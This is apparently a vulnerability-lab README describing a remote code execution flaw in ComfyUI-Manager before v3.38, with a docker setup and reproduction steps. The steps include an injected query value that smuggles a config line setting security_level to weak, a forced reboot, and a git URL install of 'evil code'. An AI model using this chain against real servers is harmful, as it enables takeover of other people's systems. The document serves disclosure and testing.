# ComfyUI-Manager Remote Command Execution Vulnerability

[中文版本(Chinese version)](README.zh-cn.md)

ComfyUI is a professional node-based GUI for Stable Diffusion, serving as a core open-source project in the AI art generation field. ComfyUI-Manager is the official extension manager for ComfyUI, handling the installation of custom nodes, models, and updates. In older versions, ComfyUI-Manager's data and configuration directories were not adequately protected by ComfyUI's Web API access controls. Attackers can exploit this vulnerability to achieve remote code execution on the server, thereby gaining full control over it. This vulnerability has been fixed in ComfyUI-Manager v3.38 by introducing the "System User Protection API", which migrates all configuration data to a protected directory.

https://mp.weixin.qq.com/s/I1_2E9OyxySwWy0KqQdJXg

Affected Versions: ComfyUI-Manager < v3.38
Safe Versions: ComfyUI-Manager >= v3.38

## Environment Setup

Execute the following command to start a ComfyUI server:

```bash
docker compose up -d
```

Visit http://localhost:8188 to see the ComfyUI interface.

## Vulnerability Reproduction

1. Modify the `config.ini` file by accessing the interface `GET /api/manager/db_mode?value=cache%0Dsecurity_level%20=%20weak`, setting `security_level` to `weak`.

![1.png](1.png)

2. Restart the server by accessing `GET /api/manager/reboot` to make the configuration take effect.

![2.png](2.png)

3. Download and install evil code by accessing `POST /api/customnode/install/git_url`, which will execute automatically.

![3.png](3.png)


## Vulnerability Researcher

Ricter Zheng from Tencent Xuanwu Lab 